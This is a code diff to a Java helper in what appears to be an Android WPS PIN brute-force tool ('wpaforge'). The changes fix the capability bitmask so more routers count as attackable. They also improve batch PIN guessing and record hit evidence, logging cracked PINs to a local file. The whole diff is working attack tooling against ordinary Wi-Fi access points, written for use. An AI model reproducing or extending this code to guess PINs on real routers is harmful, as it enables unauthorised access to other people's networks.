@@ -56,12 +56,14 @@ public final class WpsHelper {
                     break;
                 case "pin":
                     tryOne(args[1], args[2],
-                            args.length > 3 ? Integer.parseInt(args[3]) : 20);
+                            args.length > 3 ? Integer.parseInt(args[3]) : 20,
+                            args.length > 4 ? dec(args[4]) : "");
                     break;
                 case "batch":
                     batch(args[1], args[2].split(","),
                             args.length > 3 ? Integer.parseInt(args[3]) : 20,
-                            args.length > 4 ? Integer.parseInt(args[4]) : 60);
+                            args.length > 4 ? Integer.parseInt(args[4]) : 60,
+                            args.length > 5 ? dec(args[5]) : "");
                     break;
                 default:
                     raw(join(args, 0, args.length));
@@ -313,22 +315,37 @@ public final class WpsHelper {
     // ---------------- WPS 能力画像 ----------------
     //
     // 判定「这个 AP 能不能跑 PIN」不看关联时长，看它自己宣告的
-    // WSC Configuration Methods。位定义来自 WSC 规范（wps_defs.h）：
+    // WSC Configuration Methods。位定义来自 WSC 规范（wpa_supplicant 的 wps_defs.h）：
     //
-    //   0x0001 LABEL             静态 PIN 标签
-    //   0x0002 DISPLAY           AP 显示 PIN
-    //   0x0080 PUSHBUTTON        按键配对
-    //   0x0100 KEYPAD            AP 带键盘，接受外部送 PIN
-    //   0x2008 VIRTUAL_DISPLAY   虚拟显示（不含 0x0002，是独立编码）
-    //   0x4008 PHYSICAL_DISPLAY  物理显示
+    //   0x0001 USBA
+    //   0x0002 ETHERNET
+    //   0x0004 LABEL              AP 上印着静态 PIN（贴纸）
+    //   0x0008 DISPLAY            AP 能显示 PIN
+    //   0x0080 PUSHBUTTON         按键配对
+    //   0x0100 KEYPAD             AP 带键盘，接受外部送 PIN
+    //   0x0200 VIRTUAL_PUSHBUTTON
+    //   0x0280 PHYSICAL_PUSHBUTTON（= 0x0200 | 0x0080）
+    //   0x0480 VIRTUAL_DISPLAY_PIN
+    //   0x2008 PHYSICAL_DISPLAY_PIN（= 0x2000 | 0x0008）
     //
-    // 只有 KEYPAD 或 LABEL 意味着 AP 会接受第三方 registrar 送来的 PIN。
-    // 实测本机周边：BroadcomAP 报 0x2008（纯虚拟显示）→ PIN 攻击打不动；
+    // 只有 KEYPAD 或 LABEL 意味着 AP 会接受第三方 registrar 送来的 PIN
+    // —— 与 wpa_supplicant 的 pin_capable 判据一致。
+    // 实测本机周边：BroadcomAP 报 0x2008（自带屏幕显示型）→ PIN 攻击打不动；
     // fiberhome ONT 报 0x0100 → 可打。以前两者在列表里长得一模一样。
+    //
+    // 2026-11-08 修正（第二阶段审计 P1-3）：CM_LABEL 原来写成 0x0001 ——
+    // 那是 USBA 的位。后果：config_methods=0x0004（只有贴纸 PIN）的 AP
+    // 被判成 NO_PIN，界面写「不收外部 PIN」，体检还会直接跳过它 ——
+    // 用户以为打不动。组合逻辑（KEYPAD|LABEL）本来是对的，错的是常量值。
 
-    static final int CM_LABEL = 0x0001;
+    static final int CM_LABEL = 0x0004;
     static final int CM_PUSHBUTTON = 0x0080;
     static final int CM_KEYPAD = 0x0100;
+
+    /** 位掩码里是否含「接受外部 PIN」的两位之一（唯一判据出处）。 */
+    static boolean pinCapable(int mask) {
+        return (mask & CM_KEYPAD) != 0 || (mask & CM_LABEL) != 0;
+    }
 
     /**
      * BSS 输出里某个 key 的值。
@@ -458,7 +475,7 @@ public final class WpsHelper {
         String verdict;
         if (apSetupLocked(bssField(blk, "ie"))) {
             verdict = "LOCKED";
-        } else if ((mask & CM_KEYPAD) != 0 || (mask & CM_LABEL) != 0) {
+        } else if (pinCapable(mask)) {
             verdict = "PIN_OK";
         } else {
             verdict = "NO_PIN";
@@ -495,8 +512,7 @@ public final class WpsHelper {
             System.out.println("WPS_DEV=" + cap[2]);
             System.out.println("WPS_STATE=" + bssField(blk, "wps_state"));
             System.out.println("WPS_METHODS=" + cap[1]);
-            System.out.println("WPS_PIN_CAPABLE="
-                    + (((mask & CM_KEYPAD) != 0 || (mask & CM_LABEL) != 0) ? "1" : "0"));
+            System.out.println("WPS_PIN_CAPABLE=" + (pinCapable(mask) ? "1" : "0"));
             System.out.println("WPS_PBC_CAPABLE=" + (((mask & CM_PUSHBUTTON) != 0) ? "1" : "0"));
             String ie = bssField(blk, "ie");
             String[] cap2 = parseBssCap(blk);
@@ -583,12 +599,12 @@ public final class WpsHelper {
         }
     }
 
-    /** 单次 WPS PIN 尝试。 */
-    static void tryOne(String bssid, String pin, int timeoutSec) {
+    /** 单次 WPS PIN 尝试（targetSsid 用于归属判定，可空）。 */
+    static void tryOne(String bssid, String pin, int timeoutSec, String targetSsid) {
         Conn c = null;
         try {
             c = new Conn();
-            Stats st = runOne(c, bssid, pin, timeoutSec);
+            Stats st = runOne(c, bssid, pin, timeoutSec, targetSsid);
             System.out.println("PIN=" + pin);
             System.out.println("RESULT=" + st.result);
             System.out.println("ELAPSED_MS=" + st.elapsedMs);
@@ -598,9 +614,18 @@ public final class WpsHelper {
             System.out.println("LOG_KIND=" + st.logKind);
             System.out.println("M2D_TO_END_MS=" + st.m2dToEndMs);
             System.out.println("AP_LOCKED=" + st.apLocked);
-            System.out.println("HIT_SSID=" + st.hitSsid);
-            System.out.println("HIT_IP=" + st.hitIp);
+            // 命中证据：全部回传 App（修复前这三个字段只在单条路径打印，App 也不解析，
+            // 等于「采集了但不进证据体系」）。值一律 URL 编码，避免 SSID 带空格。
+            System.out.println("HIT_VERDICT=" + enc(st.hitVerdict));
+            System.out.println("HIT_WHY=" + enc(st.hitWhy));
+            System.out.println("HIT_FACTS=" + enc(st.hitFacts));
+            System.out.println("HIT_SSID=" + enc(st.hitSsid));
+            System.out.println("HIT_BSSID=" + enc(st.hitBssid));
+            System.out.println("HIT_IP=" + enc(st.hitIp));
             System.out.println("HIT_CONFIRM=" + st.hitConfirm);
+            System.out.println("HIT_NETID=" + st.hitNetId);
+            System.out.println("HIT_BASE_NETID=" + st.baseNetId);
+            System.out.println("HIT_TARGET_SSID=" + enc(st.targetSsid));
             System.out.println("LOG_TEXT=" + st.logText);
         } catch (Throwable t) {
             System.out.println("RESULT=ERROR");
@@ -615,6 +640,23 @@ public final class WpsHelper {
      * 命中即停，剩余 PIN 由 App 侧下次续跑。
      */
     static void batch(String bssid, String[] pins, int perTrySec, int totalSecBudget) {
+        batch(bssid, pins, perTrySec, totalSecBudget, "");
+    }
+
+    /**
+     * 批量尝试，减少 app_process 启动开销。
+     *
+     * <p>命中（协议确认）即停，剩余 PIN 由 App 侧下次续跑。
+     * 「疑似命中」（SUCCESS_UNVERIFIED）**不停** —— 那只是证据不足，
+     * 停下来会让真正的命中被永久跳过；它只作为证据被记下来。
+     *
+     * <p>每条 PIN 之后紧跟一行 {@code HIT …} 证据行（值 URL 编码）。
+     * 校验位不合法的候选也会输出 {@code RESULT=SKIPPED_INVALID}：
+     * App 侧据此把「处理过的条数」和「请求的条数」对齐，
+     * 不能再出现「请求 5 条、实际跑 3 条，游标却推 5」。
+     */
+    static void batch(String bssid, String[] pins, int perTrySec, int totalSecBudget,
+                      String targetSsid) {
         Conn c = null;
         long budgetStart = System.currentTimeMillis();
         int hit = 0;
@@ -624,13 +666,17 @@ public final class WpsHelper {
             for (String pin : pins) {
                 pin = pin.trim();
                 if (pin.isEmpty()) continue;
-                // 校验位不合法的 PIN 一定会被 AP 直接拒，别浪费一次尝试额度
-                if (!WpsPins.valid(pin)) continue;
+                // 校验位不合法的 PIN 一定会被 AP 直接拒，别浪费一次尝试额度；
+                // 但必须如实上报「这条被处理过了」，否则 App 侧的记账会错位。
+                if (!WpsPins.valid(pin)) {
+                    System.out.println("PIN=" + pin + " RESULT=SKIPPED_INVALID");
+                    continue;
+                }
                 if (System.currentTimeMillis() - budgetStart > totalSecBudget * 1000L) {
                     System.out.println("BUDGET=exhausted");
                     break;
                 }
-                Stats st = runOne(c, bssid, pin, perTrySec);
+                Stats st = runOne(c, bssid, pin, perTrySec, targetSsid);
                 System.out.println("PIN=" + pin + " RESULT=" + st.result
                         + " ELAPSED_MS=" + st.elapsedMs
                         + " ASSOC_COUNT=" + st.assocCount
@@ -639,6 +685,7 @@ public final class WpsHelper {
                         + " LOG_KIND=" + st.logKind
                         + " M2D_MS=" + st.m2dToEndMs
                         + " LOCKED=" + st.apLocked);
+                if (!st.hitVerdict.isEmpty()) System.out.println(evidenceLine(st, pin));
                 if ("SUCCESS".equals(st.result)) {
                     hit = 1;
                     break;
@@ -682,6 +729,85 @@ public final class WpsHelper {
         String hitIp = "";
         /** 命中后二次确认：600ms 后再查一次状态仍为 COMPLETED */
         int hitConfirm = -1;
+
+        // ---- 归属与证据（第二阶段新增） ----
+        /** 目标 BSSID / SSID（归属判定的参照物）。 */
+        String targetBssid = "";
+        String targetSsid = "";
+        /** 命中帧里当前连着的 AP 与 netId。 */
+        String hitBssid = "";
+        int hitNetId = -1;
+        /** 发命令前的基线 netId。 */
+        int baseNetId = -1;
+        /** 判定所用的那一帧（复核帧优先）的状态，供证据复算。 */
+        String hitState = "";
+        String hitKeyMgmt = "";
+        /** 本次是否与**目标**做过 km=WPS 的关联 / 是否只在别的 BSSID 上见过。 */
+        boolean sawTargetWpsSession;
+        boolean sawWpsSessionElsewhere;
+        /** 结论与理由（{@link WpsHitJudge}）。 */
+        String hitVerdict = "";
+        String hitWhy = "";
+        String hitFacts = "";
+    }
+
+    // ---------------- 命中证据 ----------------
+
+    /** 把已采集的原始事实装进判定输入（判定只在 WpsHitJudge 里做）。 */
+    static WpsHitJudge.In evidenceOf(Stats st) {
+        WpsHitJudge.In in = new WpsHitJudge.In(
+                st.targetBssid, st.targetSsid, st.baseNetId, st.hitNetId,
+                st.hitState, st.hitKeyMgmt);
+        in.connSsid = st.hitSsid;
+        in.connBssid = st.hitBssid;
+        in.connIp = st.hitIp;
+        in.confirm = st.hitConfirm;
+        in.sawTargetWpsSession = st.sawTargetWpsSession;
+        in.sawWpsSessionElsewhere = st.sawWpsSessionElsewhere;
+        return in;
+    }
+
+    /**
+     * 批量模式下的证据行（跟在 {@code PIN=…} 行后面）。
+     *
+     * <p>为什么另起一行：{@code parseBatchLine} 按空白切字段，SSID 里带空格会把
+     * 整行切碎。这里所有值先 URL 编码（空格 → +），解析端再解回来。
+     */
+    static String evidenceLine(Stats st, String pin) {
+        StringBuilder sb = new StringBuilder("HIT");
+        sb.append(" PIN=").append(enc(pin));
+        sb.append(" VERDICT=").append(enc(st.hitVerdict));
+        sb.append(" TSSID=").append(enc(st.targetSsid));
+        sb.append(" CSSID=").append(enc(st.hitSsid));
+        sb.append(" CBSSID=").append(enc(st.hitBssid));
+        sb.append(" IP=").append(enc(st.hitIp));
+        sb.append(" CID=").append(st.hitNetId);
+        sb.append(" BASE=").append(st.baseNetId);
+        sb.append(" CONFIRM=").append(st.hitConfirm);
+        sb.append(" SESS=").append(st.sawTargetWpsSession ? 1 : 0);
+        sb.append(" FACTS=").append(enc(st.hitFacts));
+        sb.append(" WHY=").append(enc(st.hitWhy));
+        return sb.toString();
+    }
+
+    /** URL 编码（空格 → +）：保证证据值里绝不出现空白。 */
+    static String enc(String v) {
+        if (v == null) return "";
+        try {
+            return java.net.URLEncoder.encode(v, "UTF-8");
+        } catch (Throwable t) {
+            return "";
+        }
+    }
+
+    /** {@link #enc} 的逆运算。 */
+    static String dec(String v) {
+        if (v == null) return "";
+        try {
+            return java.net.URLDecoder.decode(v, "UTF-8");
+        } catch (Throwable t) {
+            return "";
+        }
     }
 
     // ---------------- supplicant 日志 ----------------
@@ -783,9 +909,23 @@ public final class WpsHelper {
      * 所以「关联一结束就收工」：每次 7~9 秒，不再死等 20 秒窗口。
      */
     static Stats runOne(Conn c, String bssid, String pin, int timeoutSec) {
+        return runOne(c, bssid, pin, timeoutSec, "");
+    }
+
+    /**
+     * 单次尝试的核心（带目标 SSID）。
+     *
+     * <p>{@code targetSsid} 只服务于一件事：判定「连上的到底是不是目标」。
+     * 留空时退化为「只用 BSSID 归属」，判不出来就记「疑似」而不是「命中」——
+     * 宁可少报一次命中，也不能把别人家的网络算成目标的 PIN 命中。
+     */
+    static Stats runOne(Conn c, String bssid, String pin, int timeoutSec, String targetSsid) {
         Stats st = new Stats();
+        st.targetBssid = bssid == null ? "" : bssid;
+        st.targetSsid = targetSsid == null ? "" : targetSsid;
         String before = c.cmd("STATUS");
         int baseId = parseInt(field(before, "id"), -1);
+        st.baseNetId = baseId;
         long t0 = System.currentTimeMillis();
         logClear();
         // WPS_PIN 是同步命令：正常时回显 PIN，失败时首字符是 FAIL
@@ -840,7 +980,18 @@ public final class WpsHelper {
             }
             if ("ASSOCIATED".equals(state)) {
                 sawAssociated = true;
-                if ("WPS".equals(km)) st.sawWpsSession = true;
+                if ("WPS".equals(km)) {
+                    st.sawWpsSession = true;
+                    // 归属：这次 km=WPS 的会话开在哪个 BSSID 上。
+                    // 读不到 bssid 时按目标算 —— 这条会话本来就是我们对目标发的命令开出来的；
+                    // 但读到了就别的地方，必须记下来（那是「别的 AP 在跟我们配对」）。
+                    String ab = field(s, "bssid");
+                    if (ab.isEmpty() || ab.equalsIgnoreCase(st.targetBssid)) {
+                        st.sawTargetWpsSession = true;
+                    } else {
+                        st.sawWpsSessionElsewhere = true;
+                    }
+                }
                 if (assocStart == 0) {
                     assocStart = now;
                     st.assocCount++;
@@ -853,19 +1004,37 @@ public final class WpsHelper {
 
             int curId = parseInt(field(s, "id"), -1);
             if (isWpsHit(baseId, curId, state, km)) {
-                // 命中。这一环是本机唯一没法提前验证的（手上没有已知正确 PIN 的 AP），
-                // 所以多留些证据：SSID、IP、以及 600ms 后的二次确认。
-                st.result = "SUCCESS";
-                st.hitSsid = field(s, "ssid");
-                st.hitIp = field(s, "ip_address");
+                // 「状态像成功」只说明「netId 变了 + 已用非 WPS 的 key_mgmt 连上」。
+                // 这**不足以**判命中：手机在这段时间里连上别的网络（回连家里 WiFi、
+                // framework 自动切换、另一频段的旧配置）同样满足上面三个条件，
+                // 修复前就是这么把「别的网」记成「目标 PIN 命中」的。
+                //
+                // 归属 + 600ms 复核在这里收齐，交给 WpsHitJudge 出结论：
+                //   CONFIRMED → SUCCESS
+                //   UNVERIFIED → SUCCESS_UNVERIFIED（记疑似，不停任务）
+                st.hitNetId = curId;
                 sleep(600);
+                String s2 = null;
                 try {
-                    String s2 = c.cmd("STATUS");
-                    st.hitConfirm = ("COMPLETED".equals(field(s2, "wpa_state"))
-                            && !"WPS".equals(field(s2, "key_mgmt"))) ? 1 : 0;
+                    s2 = c.cmd("STATUS");
                 } catch (Throwable ignored) {
-                    st.hitConfirm = -1;
+                    s2 = null;
                 }
+                boolean stillUp = s2 != null && "COMPLETED".equals(field(s2, "wpa_state"))
+                        && !"WPS".equals(field(s2, "key_mgmt"));
+                st.hitConfirm = s2 == null ? -1 : (stillUp ? 1 : 0);
+                // 归属优先用复核帧：刚连上时那一帧才最可能带着 ssid / bssid / ip
+                String f2 = (s2 != null && !s2.trim().isEmpty()) ? s2 : s;
+                st.hitState = field(f2, "wpa_state");
+                st.hitKeyMgmt = field(f2, "key_mgmt");
+                st.hitSsid = field(f2, "ssid");
+                st.hitBssid = field(f2, "bssid");
+                st.hitIp = field(f2, "ip_address");
+                WpsHitJudge.In ev = evidenceOf(st);
+                st.hitVerdict = WpsHitJudge.judge(ev);
+                st.hitFacts = WpsHitJudge.facts(ev);
+                st.hitWhy = WpsHitJudge.why(ev, false);
+                st.result = WpsHitJudge.isHit(st.hitVerdict) ? "SUCCESS" : "SUCCESS_UNVERIFIED";
                 break;
             }
 
@@ -923,14 +1092,19 @@ public final class WpsHelper {
             if (dur > st.maxAssocMs) st.maxAssocMs = dur;
         }
         st.elapsedMs = System.currentTimeMillis() - t0;
-        if ("SUCCESS".equals(st.result)) {
-            // 命中是最不能丢的事件：日志会轮转、App 可能被杀，所以直接落盘
+        if (st.result.startsWith("SUCCESS")) {
+            // 命中是最不能丢的事件：日志会轮转、App 可能被杀，所以直接落盘。
+            // 疑似命中同样落盘（带 verdict），否则「证据不足」这件事会随日志轮转消失。
             try {
                 java.io.FileWriter fw = new java.io.FileWriter(
                         "/data/local/tmp/wpaforge-hit.txt", true);
-                fw.write("HIT bssid=" + bssid + " pin=" + pin
-                        + " ssid=" + st.hitSsid + " ip=" + st.hitIp
+                fw.write("HIT verdict=" + st.hitVerdict
+                        + " bssid=" + bssid + " pin=" + pin
+                        + " connBssid=" + st.hitBssid + " ssid=" + st.hitSsid
+                        + " targetSsid=" + st.targetSsid + " ip=" + st.hitIp
                         + " confirm=" + st.hitConfirm
+                        + " netId=" + st.hitNetId + " baseId=" + st.baseNetId
+                        + " facts=" + st.hitFacts + " why=" + st.hitWhy
                         + " time=" + new java.util.Date() + "\n");
                 fw.close();
             } catch (Throwable ignored) {
